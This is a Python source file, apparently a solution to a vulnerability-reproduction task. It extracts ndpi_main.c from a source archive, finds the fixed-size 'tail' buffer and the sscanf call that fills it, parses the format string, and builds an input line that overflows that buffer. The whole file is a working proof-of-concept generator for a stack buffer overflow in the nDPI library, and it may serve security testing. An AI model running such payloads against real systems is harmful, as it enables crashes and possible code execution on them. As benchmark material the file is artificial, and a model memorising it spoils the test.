import tarfile
import re


class Solution:
    def solve(self, src_path: str) -> bytes:
        try:
            with tarfile.open(src_path, "r:*") as tf:
                ndpi_main_member = None
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    name = m.name
                    if name.endswith("ndpi_main.c"):
                        ndpi_main_member = m
                        break
                if ndpi_main_member is None:
                    return self._default_payload()
                f = tf.extractfile(ndpi_main_member)
                if f is None:
                    return self._default_payload()
                code = f.read().decode("utf-8", "ignore")
        except Exception:
            return self._default_payload()

        try:
            payload = self._generate_poc(code)
            if payload is None:
                return self._default_payload()
            return payload
        except Exception:
            return self._default_payload()

    def _default_payload(self) -> bytes:
        # Fallback payload if parsing fails
        return b"A" * 80

    def _generate_poc(self, code: str) -> bytes:
        func_pos = code.find("ndpi_add_host_ip_subprotocol")
        search_region_start = func_pos if func_pos >= 0 else 0
        region = code[search_region_start:]

        m_tail = re.search(r"char\s+tail\s*\[\s*(\d+)\s*\]", region)
        if not m_tail:
            return None

        try:
            tail_size = int(m_tail.group(1))
        except Exception:
            return None

        tail_decl_global_idx = search_region_start + m_tail.start()

        # Find sscanf call that uses 'tail'
        scanf_call = None
        idx = tail_decl_global_idx
        while True:
            m_scanf = re.search(r"sscanf\s*\((.*?)\);", code[idx:], re.DOTALL)
            if not m_scanf:
                break
            candidate = m_scanf.group(1)
            if "tail" in candidate:
                scanf_call = candidate
                break
            idx += m_scanf.end()

        if scanf_call is None:
            return None

        fmt, args = self._parse_scanf_call(scanf_call)
        if fmt is None or args is None:
            return None

        # Find which argument is 'tail'
        tail_arg_index = None
        for i, arg in enumerate(args):
            if re.search(r"\btail\b", arg):
                tail_arg_index = i
                break
        if tail_arg_index is None:
            for i, arg in enumerate(args):
                if "tail" in arg:
                    tail_arg_index = i
                    break
        if tail_arg_index is None:
            return None

        convs = self._parse_scanf_format(fmt)
        if not convs:
            return None

        has_tail_conv = any(conv.assign_index == tail_arg_index for conv in convs)
        if not has_tail_conv:
            return None

        overflow_len = self._choose_overflow_length(tail_size)
        line = self._construct_input(fmt, convs, tail_arg_index, overflow_len)
        if not line.endswith("\n"):
            line += "\n"

        return line.encode("ascii", "replace")

    def _parse_scanf_call(self, call_str: str):
        """
        Parse inside of sscanf(...) into (format_string, argument_list).
        """
        s = call_str.strip()
        first_comma = s.find(",")
        if first_comma == -1:
            return None, None
        after0 = s[first_comma + 1 :].lstrip()

        fmt, consumed = self._parse_c_string_concatenation(after0)
        if fmt is None:
            return None, None

        rest = after0[consumed:]
        i = 0
        while i < len(rest) and rest[i].isspace():
            i += 1
        if i >= len(rest) or rest[i] != ",":
            # No arguments: unusual, but handle
            return fmt, []
        args_part = rest[i + 1 :]
        args = self._split_args(args_part)
        return fmt, args

    def _parse_c_string_concatenation(self, s: str):
        """
        Parse one or more adjacent C string literals from s.
        Returns (decoded_string, index_after_literals) or (None, 0) on failure.
        """
        i = 0
        n = len(s)
        parts = []
        consumed_any = False
        while True:
            while i < n and s[i].isspace():
                i += 1
            if i >= n or s[i] != '"':
                break
            part, new_i = self._parse_c_string_literal(s, i)
            if part is None:
                break
            parts.append(part)
            consumed_any = True
            i = new_i
        if not consumed_any:
            return None, 0
        return "".join(parts), i

    def _parse_c_string_literal(self, s: str, start: int):
        """
        Parse a single C string literal in s starting at index 'start'.
        Returns (decoded_string, index_after_literal) or (None, start) on failure.
        """
        n = len(s)
        if start >= n or s[start] != '"':
            return None, start
        i = start + 1
        out_chars = []
        while i < n:
            c = s[i]
            if c == '"':
                return "".join(out_chars), i + 1
            if c == "\\":
                i += 1
                if i >= n:
                    break
                esc = s[i]
                if esc == "n":
                    out_chars.append("\n")
                elif esc == "r":
                    out_chars.append("\r")
                elif esc == "t":
                    out_chars.append("\t")
                elif esc == "v":
                    out_chars.append("\v")
                elif esc == "b":
                    out_chars.append("\b")
                elif esc == "f":
                    out_chars.append("\f")
                elif esc == "a":
                    out_chars.append("\a")
                elif esc == "\\":
                    out_chars.append("\\")
                elif esc == '"':
                    out_chars.append('"')
                elif esc == "'":
                    out_chars.append("'")
                elif esc in "01234567":
                    digits = esc
                    j = i + 1
                    while j < n and len(digits) < 3 and s[j] in "01234567":
                        digits += s[j]
                        j += 1
                    i = j - 1
                    try:
                        out_chars.append(chr(int(digits, 8)))
                    except ValueError:
                        pass
                elif esc == "x":
                    digits = ""
                    j = i + 1
                    while (
                        j < n
                        and len(digits) < 2
                        and s[j] in "0123456789abcdefABCDEF"
                    ):
                        digits += s[j]
                        j += 1
                    i = j - 1
                    if digits:
                        try:
                            out_chars.append(chr(int(digits, 16)))
                        except ValueError:
                            pass
                else:
                    out_chars.append(esc)
            else:
                out_chars.append(c)
            i += 1
        return None, start

    def _split_args(self, s: str):
        """
        Split a C argument list string by top-level commas.
        """
        args = []
        current = []
        depth = 0
        i = 0
        n = len(s)
        while i < n:
            ch = s[i]
            if ch == "(":
                depth += 1
                current.append(ch)
            elif ch == ")":
                if depth > 0:
                    depth -= 1
                current.append(ch)
            elif ch == "," and depth == 0:
                arg = "".join(current).strip()
                if arg:
                    args.append(arg)
                current = []
            else:
                current.append(ch)
            i += 1
        last = "".join(current).strip()
        if last:
            args.append(last)
        return args

    class _Conv:
        __slots__ = ("type", "charclass", "assigns", "assign_index")

        def __init__(self, typ, charclass, assigns):
            self.type = typ
            self.charclass = charclass
            self.assigns = assigns
            self.assign_index = None

    def _parse_scanf_format(self, fmt: str):
        """
        Parse scanf format string into a list of Conv objects.
        """
        convs = []
        i = 0
        n = len(fmt)
        while i < n:
            c = fmt[i]
            if c != "%":
                i += 1
                continue
            if i + 1 < n and fmt[i + 1] == "%":
                i += 2
                continue
            i += 1
            assigns = True
            if i < n and fmt[i] == "*":
                assigns = False
                i += 1
            # width
            while i < n and fmt[i].isdigit():
                i += 1
            # length modifiers
            while i < n and fmt[i] in "hlLjzt":
                i += 1
            if i >= n:
                break
            conv_char = fmt[i]
            charclass = None
            if conv_char == "[":
                j = i + 1
                if j < n and fmt[j] == "^":
                    j += 1
                if j < n and fmt[j] == "]":
                    j += 1
                while j < n and fmt[j] != "]":
                    j += 1
                charclass = fmt[i + 1 : j]
                i = j
                conv_char = "["
            convs.append(self._Conv(conv_char, charclass, assigns))
            i += 1

        assign_idx = 0
        for conv in convs:
            if conv.assigns:
                conv.assign_index = assign_idx
                assign_idx += 1
            else:
                conv.assign_index = None
        return convs

    def _choose_overflow_length(self, tail_size: int) -> int:
        if tail_size <= 0:
            return 80
        length = max(tail_size * 4, tail_size + 16, 64)
        if length > 512:
            length = 512
        return length

    def _construct_input(self, fmt: str, convs, tail_assign_index: int, overflow_len: int) -> str:
        """
        Build input string matching scanf format `fmt` and overflowing the
        argument whose assign_index == tail_assign_index.
        """
        out = []
        i = 0
        n = len(fmt)
        conv_idx = 0
        while i < n:
            c = fmt[i]
            if c != "%":
                out.append(c)
                i += 1
                continue
            if i + 1 < n and fmt[i + 1] == "%":
                out.append("%")
                i += 2
                continue

            i += 1
            if i >= n:
                break
            if fmt[i] == "*":
                i += 1
            while i < n and fmt[i].isdigit():
                i += 1
            while i < n and fmt[i] in "hlLjzt":
                i += 1
            if i >= n or conv_idx >= len(convs):
                break
            conv_char = fmt[i]
            if conv_char == "[":
                j = i + 1
                if j < n and fmt[j] == "^":
                    j += 1
                if j < n and fmt[j] == "]":
                    j += 1
                while j < n and fmt[j] != "]":
                    j += 1
                i = j
                conv_char = "["
            conv = convs[conv_idx]
            conv_idx += 1
            is_tail = conv.assign_index == tail_assign_index
            token = self._make_token_for_conv(conv, is_tail, overflow_len)
            out.append(token)
            i += 1
        return "".join(out)

    def _make_token_for_conv(self, conv, is_tail: bool, overflow_len: int) -> str:
        t = conv.type
        if t in "diuoxXp":
            return "1"
        if t in "fFeEgGaA":
            return "1.0"
        if t == "s":
            if is_tail:
                return "A" * overflow_len
            return "foo"
        if t == "[":
            ch = self._choose_char_for_charclass(conv.charclass)
            if is_tail:
                return ch * overflow_len
            return ch
        if t == "c":
            return "X"
        if t == "n":
            return ""
        return "Z"

    def _choose_char_for_charclass(self, cls: str) -> str:
        if not cls:
            return "A"
        negated = cls[0] == "^"
        content = cls[1:] if negated else cls
        singles = set()
        ranges = []
        i = 0
        n = len(content)
        while i < n:
            ch = content[i]
            if i + 2 < n and content[i + 1] == "-" and content[i + 2] != "]":
                lo = content[i]
                hi = content[i + 2]
                ranges.append((lo, hi))
                i += 3
            else:
                singles.add(ch)
                i += 1

        def in_positive(c: str) -> bool:
            if c in singles:
                return True
            for lo, hi in ranges:
                if lo <= c <= hi:
                    return True
            return False

        def is_allowed(c: str) -> bool:
            r = in_positive(c)
            return (not r) if negated else r

        for cand in "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789.-:_/":
            if is_allowed(cand):
                return cand
        return "A" if not negated else "Z"